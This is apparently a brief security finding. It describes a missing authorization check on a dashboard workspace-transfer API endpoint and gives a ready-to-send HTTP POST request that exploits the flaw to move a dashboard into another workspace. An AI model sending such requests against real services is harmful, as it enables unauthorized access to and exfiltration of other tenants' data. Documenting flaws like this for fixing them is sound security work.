diagnosis: While the action calls self.get_object() to ensure the caller has access to the source dashboard, it reassigns dashboard.workspace_id to dest_workspace_id without verifying that request.user is a member or admin of dest_workspace_id. Users can transfer sensitive dashboards into workspaces they do not have rights to or exfiltrate assets across workspaces.
exploit_request:
POST /api/dashboards/308/transfer-workspace/ HTTP/1.1
Host: bi.analyticscloud.com
Authorization: Bearer <member_jwt>
Content-Type: application/json

{"dest_workspace_id": 912}
